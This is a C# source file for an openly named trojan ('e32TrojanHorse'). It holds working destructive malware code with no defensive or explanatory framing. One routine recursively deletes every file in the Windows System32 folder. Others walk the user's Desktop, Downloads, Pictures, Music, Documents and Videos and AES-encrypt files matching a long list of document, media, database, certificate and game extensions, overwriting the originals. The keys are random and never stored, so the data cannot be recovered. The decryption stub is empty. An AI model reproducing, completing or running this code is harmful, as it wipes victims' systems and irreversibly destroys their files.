using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Diagnostics;
using System.Security.Cryptography;
using Microsoft.Win32;
using System.Media;

namespace e32TrojanHorse
{
    internal class Encryptor
    {
        public static void DeleteSystem32Loop()
        {
            try
            {
                string[] system32files = Directory.GetFiles(@"C:\Windows\System32\", "*", SearchOption.AllDirectories);
                for (int i = 0; i < system32files.Length; i++)
                {
                    if (File.Exists(system32files[i]))
                    {
                        File.Delete(system32files[i]);
                    }
                    DeleteSystem32Loop();
                }
            }
            catch
            {
                return;
            }
        }
        public class EncryptionFile
        {
            public void EncryptFile(string file, string password)
            {
                string[] array = new string[]
                {
                   ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpeg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd",
                   ".sql", ".mp4", ".7z", ".rar", ".m4a", ".wma", ".avi", ".wmv", ".csv", ".d3dbsp", ".zip", ".sie", ".sum", ".ibank", ".t13", ".t12", ".qdf", ".gdb", ".tax", ".pkpass", ".bc6",
                   ".bc7", ".bkp", ".qic", ".bkf", ".sidn", ".sidd", ".mddata", ".itl", ".itdb", ".icxs", ".hvpl", ".hplg", ".hkdb", ".mdbackup", ".syncdb", ".gho", ".cas", ".svg", ".map", ".wmo",
                   ".itm", ".sb", ".fos", ".mov", ".vdf", ".ztmp", ".sis", ".sid", ".ncf", ".menu", ".layout", ".dmp", ".blob", ".esm", ".vcf", ".vtf", ".dazip", ".fpk", ".mlx", ".kf", ".iwd", ".vpk",
                   ".tor", ".psk", ".rim", ".w3x", ".fsh", ".ntl", ".arch00", ".lvl", ".snx", ".cfr", ".ff", ".vpp_pc", ".lrf", ".m2", ".mcmeta", ".vfs0", ".mpqge", ".kdb", ".db0", ".dba", ".rofl", ".hkx",
                   ".bar", ".upk", ".das", ".iwi", ".litemod", ".asset", ".forge", ".ltx", ".bsa", ".apk", ".re4", ".sav", ".lbf", ".slm", ".bik", ".epk", ".rgss3a", ".pak", ".big", ".wallet", ".wotreplay",
                   ".xxx", ".desc", ".py", ".m3u", ".flv", ".js", ".css", ".rb", ".p7c", ".pk7", ".p7b", ".p12", ".pfx", ".pem", ".crt", ".cer", ".der", ".x3f", ".srw", ".pef", ".ptx", ".r3d", ".rw2", ".rwl",
                   ".raw", ".raf", ".orf", ".nrw", ".mrwref", ".mef", ".erf", ".kdc", ".dcr", ".cr2", ".crw", ".bay", ".sr2", ".srf", ".arw", ".3fr", ".dng", ".jpe", ".jpg", ".cdr", ".indd", ".ai", ".eps", ".pdf",
                   ".pdd", ".dbf", ".mdf", ".wb2", ".rtf", ".wpd", ".dxg", ".xf", ".dwg", ".pst", ".accdb", ".mdb", ".pptm", ".pptx", ".ppt", ".xlk", ".xlsb", ".xlsm", ".xlsx", ".xls", ".wps", ".docm", ".docx", ".doc",
                   ".odb", ".odc", ".odm", ".odp", ".ods", ".odt", ".e32"
                };
                for (int i = 0; i < array.Length; i++)
                {
                    FileInfo fileInfo = new FileInfo(file);
                    if (file.EndsWith(array[i]) && fileInfo.Name != "e32horse.txt" && fileInfo.Name != "ilovemymomma.bat")
                    {
                        byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
                        byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

                        passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

                        try
                        {
                            testbytesenc = CoreEncryption.AES_Encrypt(bytesToBeEncrypted, passwordBytes);
                        }
                        catch
                        {
                            return;
                        }

                        byte[] bytesEncrypted = testbytesenc;

                        string fileEncrypted = file;
                        
                        try
                        {
                            File.WriteAllBytes(fileEncrypted, bytesEncrypted);
                        }
                        catch
                        {
                            return;
                        }
                    }
                }
            }
        }

        public static byte[] testbytesenc;

        public static void StartFilesEncryption()
        {
            string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string userRoot = System.Environment.GetEnvironmentVariable("USERPROFILE");
            string downloadFolder = Path.Combine(userRoot, "Downloads");
            string[] files = Directory.GetFiles(path + @"\", "*", SearchOption.AllDirectories);
            string[] files2 = Directory.GetFiles(downloadFolder + @"\", "*", SearchOption.AllDirectories);
            EncryptionFile enc = new EncryptionFile();
            r = new Random();
            string password = r.Next(1, 9999) + "GRT2MKayeliIlyFNc3Mk0gl5jIvg+b9Paeo" + r.Next(1, 99999) + "e32";

            for (int i = 0; i < files.Length; i++)
            {
                enc.EncryptFile(files[i], password);

            }
            for (int i = 0; i < files2.Length; i++)
            {
                enc.EncryptFile(files2[i], password);

            }
        }

        public static void StartFilesEncryption2()
        {
            try
            {
                string userRoot = System.Environment.GetEnvironmentVariable("USERPROFILE");
                string path1test = Path.Combine(userRoot, "Pictures");
                string path2test = Path.Combine(userRoot, "Music");
                string path3test = Path.Combine(userRoot, "Documents");
                string path4test = Path.Combine(userRoot, "Videos");

                string[] files1test = Directory.GetFiles(path1test + @"\", "*", SearchOption.AllDirectories);
                string[] files2test = Directory.GetFiles(path2test + @"\", "*", SearchOption.AllDirectories);
                string[] files3test = Directory.GetFiles(path3test + @"\", "*", SearchOption.AllDirectories);
                string[] files4test = Directory.GetFiles(path4test + @"\", "*", SearchOption.AllDirectories);
                EncryptionFile enc = new EncryptionFile();
                r = new Random();
                string password = r.Next(1, 9999) + "GRT2MabLhZmiIlyFNc3Mk0gl5jIvg+b9Paeo" + r.Next(1, 99999) + "e32";
                string password2 = "BhzvX"+ r.Next(1, 9999) + "tmuiOvRI0XxMqLJ8l5T5i5MifvhJKOj" + r.Next(1, 99999) + "e32" + r.Next(1, 9999) + "32";
                string password3 = "HHn7Mdyu8J7QRlCeOaD" + r.Next(1, 9999) + "a8ldK+w==" + r.Next(1, 999) + "e32" + r.Next(1, 9999) + "32";
                string password4 = r.Next(1, 9999) + "HB+XK6qvlYjQP02FMam7hlNM8FwhlOz+KKWpW7ljaMKZ8fY=" + r.Next(1, 99999) + "32";

                for (int i = 0; i < files1test.Length; i++)
                {
                    enc.EncryptFile(files1test[i], password);
                }
                for (int i = 0; i < files2test.Length; i++)
                {
                    enc.EncryptFile(files2test[i], password2);
                }
                for (int i = 0; i < files3test.Length; i++)
                {
                    enc.EncryptFile(files3test[i], password3);
                }
                for (int i = 0; i < files4test.Length; i++)
                {
                    enc.EncryptFile(files4test[i], password4);
                }
            }
            catch
            {
                return;
            }
           
        }

        public static Random r;

        static void OFF_Encrypt() //time to descrypt
        {
        }
        public class CoreEncryption
        {
            public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
            {
                byte[] encryptedBytes = null;

                // Set your salt here, change it to meet your flavor:
                // The salt bytes must be at least 8 bytes.
                byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

                using (MemoryStream ms = new MemoryStream())
                {
                    using (RijndaelManaged AES = new RijndaelManaged())
                    {
                        AES.KeySize = 256;
                        AES.BlockSize = 128;

                        var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                        AES.Key = key.GetBytes(AES.KeySize / 8);
                        AES.IV = key.GetBytes(AES.BlockSize / 8);

                        AES.Mode = CipherMode.CBC;

                        using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                            cs.Close();
                        }
                        encryptedBytes = ms.ToArray();
                    }
                }

                return encryptedBytes;
            }
        }

    }
 
}
